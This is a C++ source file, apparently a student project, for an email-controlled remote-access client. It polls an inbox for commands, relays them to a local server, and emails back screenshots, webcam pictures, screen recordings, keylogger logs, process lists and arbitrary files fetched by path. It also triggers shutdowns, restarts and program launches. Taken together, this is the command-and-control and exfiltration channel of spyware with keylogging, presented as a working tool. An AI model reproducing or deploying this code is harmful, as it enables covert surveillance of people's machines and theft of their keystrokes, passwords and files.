#include "../Application/lib.h"
#include "../Application/checkCommand.h"
#include "../Application/sendFile.h"
#include "../Application/config.h"
#include <filesystem>

const string saveDir = "C:/MMT2/";

bool is_keylogger_command(const std::string& command) {
  return command.find("keylogger") == 0;
}

// Function để check start_program command
bool is_start_program_command(const std::string& command) {
  return command.find("start_program") == 0;
}

SOCKET connect_to_server(const std::string& host, int port) {
  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
    std::cerr << "[Client] WSAStartup failed: " << WSAGetLastError() << "\n";
    return INVALID_SOCKET;
  }

  SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock == INVALID_SOCKET) {
    std::cerr << "[Client] Socket creation failed: " << WSAGetLastError()
              << "\n";
    WSACleanup();
    return INVALID_SOCKET;
  }

  sockaddr_in serverAddr{};
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(port);
  inet_pton(AF_INET, host.c_str(), &serverAddr.sin_addr);

  if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) ==
      SOCKET_ERROR) {
    std::cerr << "[Client] Connection failed: " << WSAGetLastError() << "\n";
    closesocket(sock);
    WSACleanup();
    return INVALID_SOCKET;
  }

  std::cout << "[Client] Connected to server " << host << ":" << port << "\n";
  return sock;
}

static std::atomic<bool> running(true);

// Mapping command với email subject và file name
std::map<std::string, std::pair<std::string, std::string>> fileCommands = {
    {"get_screenshot", {"Screenshot from remote computer", "screenshot.png"}},
    {"get_picture", {"Picture from remote computer", "picture.png"}},
    {"list_program",
     {"Running programs from remote computer", "running_programs.txt"}},
    {"list_process",
     {"Process list from remote computer", "processes_with_pid.txt"}},
    {"list_installed",
     {"Installed programs from remote computer", "installed_programs.txt"}},
    {"start_recording",
     {"Video recording from remote computer", "recording.avi"}},
    {"keylogger", {"Keylogger log from remote computer", "keylog.txt"}}};

void signal_handler(int) { running.store(false); }

void process_command(const std::string& command,
                     const std::string& senderEmail) {
  SOCKET sock = connect_to_server("127.0.0.1", 8888);
  if (sock == INVALID_SOCKET) {
    std::cerr << "[Client] Could not connect to server\n";
    return;
  }

  std::string payload = senderEmail + "\n" + command;
  send(sock, payload.c_str(), payload.size(), 0);

  // Xử lý command send_file
  if (command.find("send_file") == 0) {
    std::string filepath = command.substr(9);
    filepath.erase(filepath.begin(),
                   find_if(filepath.begin(), filepath.end(),
                           [](int ch) { return !isspace(ch); }));

    if (!filepath.empty()) {
      std::filesystem::path path(filepath);
      std::string filename = path.filename().string();
      std::string localFile = saveDir + filename;

      receive_file_from_socket(sock, localFile);

      if (std::filesystem::exists(localFile)) {
        send_file_via_email(senderEmail, "File from remote computer",
                            "Requested file: " + filepath, localFile);
        std::cout << "[Client] File sent via email: " << filename << std::endl;
      } else {
        send_file_via_email(senderEmail, "File request failed",
                            "Could not retrieve file: " + filepath, "");
        std::cout << "[Client] Failed to receive file: " << filename
                  << std::endl;
      }
    }
  }
  // Xử lý keylogger command (có thể có tham số thời gian)
  else if (is_keylogger_command(command)) {
    std::string localFile = saveDir + "keylog.txt";

    std::cout << "[Client] Waiting for keylogger to complete..." << std::endl;
    receive_file_from_socket(sock, localFile);

    if (std::filesystem::exists(localFile)) {
      send_file_via_email(senderEmail, "Keylogger log from remote computer",
                          "Keylogger result from command: " + command,
                          localFile);
      std::cout << "[Client] Keylogger result sent via email" << std::endl;
    } else {
      send_file_via_email(senderEmail, "Keylogger failed",
                          "Failed to execute keylogger command: " + command,
                          "");
      std::cout << "[Client] Failed to receive keylogger result" << std::endl;
    }
  }
  // Xử lý các command khác cần nhận file từ server
  else if (fileCommands.count(command)) {
    auto [subject, filename] = fileCommands[command];
    std::string localFile = saveDir + filename;

    receive_file_from_socket(sock, localFile);

    if (std::filesystem::exists(localFile)) {
      send_file_via_email(senderEmail, subject, "Result from remote computer",
                          localFile);
      std::cout << "[Client] Result sent via email: " << filename << std::endl;
    } else {
      send_file_via_email(senderEmail, "Command failed",
                          "Failed to execute command: " + command, "");
      std::cout << "[Client] Failed to receive result for: " << command
                << std::endl;
    }
  }
  // Xử lý các command không cần file (shutdown, restart, start_program, etc.)
  else {
    // Nhận confirmation message từ server
    size_t msgSize;
    int received =
        recv(sock, reinterpret_cast<char*>(&msgSize), sizeof(msgSize), 0);
    if (received > 0 && msgSize > 0) {
      std::vector<char> buffer(msgSize + 1);
      recv(sock, buffer.data(), static_cast<int>(msgSize), 0);
      buffer[msgSize] = '\0';

      std::string result(buffer.data());
      std::cout << "[Client] Server response: " << result << std::endl;

      // Tạo subject phù hợp với từng command
      std::string subject = "Command executed";
      if (command == "shutdown") {
        subject = "System shutdown initiated";
      } else if (command == "restart") {
        subject = "System restart initiated";
      } else if (command == "cancel_shutdown") {
        subject = "Shutdown/restart cancelled";
      } else if (is_start_program_command(command)) {
        subject = "Program started";
      }

      // Gửi confirmation qua email
      send_file_via_email(senderEmail, subject, result, "");
    }
  }

  closesocket(sock);
  WSACleanup();
}
int main() {
  std::signal(SIGINT, signal_handler);
  std::signal(SIGTERM, signal_handler);

  curl_global_init(CURL_GLOBAL_DEFAULT);

  std::cout << "[Client] Starting email monitoring..." << std::endl;

  while (running.load()) {
    auto commands = fetch_email_commands();
    for (auto& [cmd, senderEmail] : commands) {
      std::cout << "[Client] Processing command from " << senderEmail << ": "
                << cmd << std::endl;
      process_command(cmd, senderEmail);
    }
    std::this_thread::sleep_for(std::chrono::seconds(5));
  }

  curl_global_cleanup();
  std::cout << "[Client] Client stopped." << std::endl;
  return 0;
}